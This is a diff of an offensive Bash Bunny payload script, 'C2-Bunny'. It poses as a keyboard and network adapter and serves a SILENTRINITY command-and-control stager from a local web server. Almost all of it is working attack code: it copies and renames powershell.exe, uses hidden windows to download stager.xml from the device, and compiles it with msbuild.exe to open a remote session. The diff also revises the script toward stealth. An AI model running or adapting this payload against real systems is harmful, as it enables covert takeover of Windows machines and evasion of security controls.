@@ -1,33 +1,34 @@
 #!/bin/bash
-# Delay is a work in progress, trying to improve effiencey. 
-# Can we make this stealthier?
+#
+# Title:         C2-Bunny
+# Author:        almart
+# Version:       1.0
+# Dependencies:  SILENTRINITY, gohttp
+# Runtime: ~10 seconds
+#
+#
+# Sets up Ethernet and HID keyboard interfaces simultaneously,
+# then sets a web server that serves a SILENTRINITY stager.
+# Powershell is renamed and copied to the targets /Temp/ directory.
+# The script downloads the stager and compiles the stager to obtain a session.
+
+#Setup
 
 LED SETUP
-ATTACKMODE RNDIS_ETHERNET HID 
-
-# SETUP
-
+ATTACKMODE RNDIS_ETHERNET HID
 
 LED STAGE1
-gohttp -d=/home -p=80 &
+# Starting a http server on the switch payload
+gohttp -d=/home -p 80 &
 
-
+LED ATTACK
+RUN WIN "cmd /c copy C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe C:\p.exe"
 LED STAGE2
-# Default powershell path , may be nice to include some basic checks
+Q DELAY 5000
 
-RUN WIN "cmd /c copy C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe C:\Temp\p.exe"
+# Possible to download the stagers in several ways, Powershell used for convenience
+RUN WIN "p.exe -windowstyle hidden Invoke-WebRequest http://172.16.64.1/stager.xml -OutFile C:\stager.xml"
+Q DELAY 5000
 
-
-Q DELAY 20000
-
-# RUN WIN "iexplore.exe http://172.16.64.1/stager.xml"
-
-RUN WIN "C:\Temp\p.exe Invoke-WebRequest http://172.16.64.1/stager.xml -OutFile C:\Temp\\stager.xml"
-
-# Q DELAY 10000
-
-
-RUN WIN "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\Temp\stager.xml"
-
-
-LED FINISH  
+RUN WIN "p.exe -windowstyle hidden C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\stager.xml"
+LED FINISH
